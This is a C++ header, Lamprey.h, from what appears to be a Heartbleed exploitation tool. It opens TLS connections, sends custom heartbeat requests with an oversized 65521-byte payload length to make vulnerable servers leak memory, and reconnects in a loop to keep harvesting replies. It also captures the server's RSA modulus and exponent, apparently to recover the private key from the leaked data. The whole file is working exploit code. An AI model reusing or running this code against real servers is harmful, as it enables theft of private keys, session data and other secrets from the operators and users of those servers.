//  Lamprey.h

//  Copyright (C) 2014 Mike Shema (mike@deadliestwebattacks.com)

//  This program is free software; you can redistribute it and/or modify
//  it under the terms of the GNU General Public License as published by
//   the Free Software Foundation; either version 2 of the License, or
//  (at your option) any later version.

//  This program is distributed in the hope that it will be useful,
//  but WITHOUT ANY WARRANTY; without even the implied warranty of
//  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//  GNU General Public License for more details.

//  You should have received a copy of the GNU General Public License along
//  with this program; if not, write to the Free Software Foundation, Inc.,
//  51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

#ifndef _LAMPREY_H_
#define _LAMPREY_H_

#include "Plasma.h"
#include <boost/asio.hpp>
#include <boost/asio/ssl.hpp>
#include <boost/noncopyable.hpp>

extern "C" {
#include "heartbeat.h"
}

class Lamprey : boost::noncopyable
{
public:
  Lamprey(boost::asio::io_service& io_service,
      boost::asio::ssl::context& context,
      boost::asio::ip::tcp::resolver::iterator endpoint_iterator)
    : m_plasma(nullptr)
    , m_socket(new boost::asio::ssl::stream<boost::asio::ip::tcp::socket>(io_service, context))
    , m_io_service(io_service)
    , m_ctx(context)
    , m_endpoint_iterator(endpoint_iterator)
    , m_nudge{"GET /favicon.ico HTTP/1.0\r\n\r\n"}
  {
    m_socket->set_verify_mode(boost::asio::ssl::verify_client_once);
    m_socket->set_verify_callback(
      [this](bool b, boost::asio::ssl::verify_context& ctx){
        return verify_certificate(b, ctx);
      });

    SSL_set_info_callback(m_socket->native_handle(),
      [](const SSL *ssl, int where, int ret){
        if(where & SSL_CB_ALERT) {
          const char *str = (where & SSL_CB_READ) ? "read" : "write";
          std::cerr << "alert " << str << ": " << SSL_alert_type_string_long(ret) << ": "
                    << SSL_alert_desc_string_long(ret) << "\n";
        }
      });

    boost::asio::async_connect(m_socket->lowest_layer(), endpoint_iterator,
      [this](boost::system::error_code ec, boost::asio::ip::tcp::resolver::iterator){
        handle_connect(ec);
      });
  }

  bool verify_certificate(bool preverified, boost::asio::ssl::verify_context& ctx)
  {
    if(!m_plasma)
      return true;

    X509 *cert = X509_STORE_CTX_get_current_cert(ctx.native_handle());
    if(cert) {
      EVP_PKEY *pktmp = X509_get_pubkey(cert);
      if(pktmp) {
        auto bits = EVP_PKEY_bits(pktmp);
        m_plasma->setBitLength(bits);

        if(pktmp->type == 6) {
          char  *e_dec = BN_bn2dec(pktmp->pkey.rsa->e),
                *n_dec = BN_bn2dec(pktmp->pkey.rsa->n);
          m_plasma->setRsa(n_dec, e_dec);

          OPENSSL_free(e_dec);
          OPENSSL_free(n_dec);
        }

        EVP_PKEY_free(pktmp);
        m_plasma = nullptr;
      }
    }
    return true;
  }

  void handle_connect(boost::system::error_code const& error)
  {
    if(!error) {
      m_socket->async_handshake(boost::asio::ssl::stream_base::client,
        [this](boost::system::error_code ec){
          handle_handshake(ec);
        });
    }
    else {
      std::cerr << "Connect failed: " << error.message() << "\n";
    }
  }

  void handle_handshake(boost::system::error_code const& error)
  {
    if(!error) {
      std::cout << "Handshake succeeded\n";

      handle_heartbeat(error);
    }
    else {
      std::cerr << "Handshake failed: " << error.message() << "\n";
      handle_failure(error);
    }
  }

  void handle_heartbeat(boost::system::error_code const& error)
  {
    if(!error) {
      auto payloadLength = 65521;

      tls1_heartbeat_custom(m_socket->native_handle(), payloadLength);
      std::cout << "Heartbeat sent\n";

      boost::asio::async_write(*m_socket,
          boost::asio::buffer(m_nudge.data(), m_nudge.size()),
          [this](boost::system::error_code ec, size_t bytes_transferred){
            handle_write(ec, bytes_transferred);
          });
    }
    else {
      std::cerr << "Heartbeat failed: " << error.message() << "\n";
    }
  }

  void handle_write(boost::system::error_code const& error, size_t bytes_transferred)
  {
    if(!error) {
      std::cout << "Sent nudge\n";
      boost::asio::async_read(*m_socket,
          boost::asio::buffer(reply_, bytes_transferred),
          [this](boost::system::error_code ec, size_t n){
            handle_read(ec, n);
          });
    }
    else {
      std::cerr << "Write failed: " << error.message() << "\n";
    }
  }

  void handle_read(boost::system::error_code const& error, size_t bytes_transferred)
  {
    if(!error && bytes_transferred > 0) {
      boost::asio::async_read(*m_socket,
        boost::asio::buffer(reply_, bytes_transferred),
        [this](boost::system::error_code ec, size_t n){
          handle_read(ec, n);
        });
    }
    else if(error) {
      std::cerr << "Read failed: " << error.message() << "\n";

      m_socket->async_shutdown(
        [this](boost::system::error_code ec){
          handle_shutdown(ec);
        });
    }
  }

  void handle_shutdown(boost::system::error_code const& error)
  {
    std::cout << "shutdown\n";

    if(!error) {
//      m_socket.reset(new boost::asio::ssl::stream<boost::asio::ip::tcp::socket>(m_io_service, m_ctx));
      SSL_clear(m_socket->native_handle());
      boost::asio::async_connect(m_socket->lowest_layer(), m_endpoint_iterator,
        [this](boost::system::error_code ec, boost::asio::ip::tcp::resolver::iterator){
          handle_connect(ec);
        });
    }
    else {
      std::cerr << "Shutdown failed: " << error.message() << "\n";
      handle_failure(error);
    }
  }

  void handle_failure(boost::system::error_code const& error)
  {
    m_socket->shutdown();
    m_socket->lowest_layer().close();
    m_socket.reset(new boost::asio::ssl::stream<boost::asio::ip::tcp::socket>(m_io_service, m_ctx));
    boost::system::error_code ec;
    handle_shutdown(ec);
  }

  void setPlasma(Plasma *p) { m_plasma = p; }

private:
  enum { max_length = 1024 };

  Plasma *m_plasma;

  std::unique_ptr<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>> m_socket;
  boost::asio::io_service&    m_io_service;
  boost::asio::ssl::context&  m_ctx;
  boost::asio::ip::tcp::resolver::iterator m_endpoint_iterator;
  std::string m_nudge;
  char reply_[max_length];
};

#endif
